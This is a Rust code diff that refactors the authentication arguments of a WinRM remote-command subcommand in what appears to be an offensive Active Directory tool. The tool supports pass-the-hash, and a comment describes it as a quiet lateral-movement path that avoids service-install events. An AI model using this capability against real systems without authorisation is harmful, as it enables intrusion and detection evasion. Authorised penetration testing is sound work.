@@ -9,19 +9,11 @@ use crate::winrm;
 
 #[derive(Parser)]
 pub(crate) struct WinrmArgs {
-    /// Target host or IP
-    #[arg(long)]
-    pub host: String,
+    #[command(flatten)]
+    pub auth: crate::shared_args::SmbAuth,
     /// WinRM port (5985 HTTP)
     #[arg(long, default_value_t = 5985)]
     pub port: u16,
-    /// NetBIOS or DNS domain (use "." or the host for a local account)
-    #[arg(long)]
-    pub domain: String,
-    #[arg(long)]
-    pub user: String,
-    #[arg(long, default_value = "")]
-    pub password: String,
     /// Pass-the-hash: NT hash (32 hex) instead of --password
     #[arg(long)]
     pub nt_hash: Option<String>,
@@ -33,7 +25,7 @@ pub(crate) struct WinrmArgs {
 /// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
 /// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
 pub(crate) async fn winrm_exec(mut a: WinrmArgs) -> Result<()> {
-    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
     let secret = match &a.nt_hash {
         Some(h) => {
             let raw = hex::decode(h.trim()).context("NT hash must be 32 hex chars")?;
@@ -43,13 +35,13 @@ pub(crate) async fn winrm_exec(mut a: WinrmArgs) -> Result<()> {
                 .context("NT hash must be exactly 16 bytes (32 hex)")?;
             winrm::Secret::NtHash(arr)
         }
-        None => winrm::Secret::Password(a.password.clone()),
+        None => winrm::Secret::Password(a.auth.password.clone()),
     };
     let (mut client, shell_id) =
-        winrm::WinRm::connect(&a.host, a.port, &a.domain, &a.user, &secret).await?;
+        winrm::WinRm::connect(&a.auth.host, a.port, &a.auth.domain, &a.auth.user, &secret).await?;
     eprintln!(
         "[+] WinRM shell opened on {} (ShellId {})",
-        a.host, shell_id
+        a.auth.host, shell_id
     );
     let (stdout, stderr, exit) = client.run(&shell_id, &a.command).await?;
     print!("{stdout}");
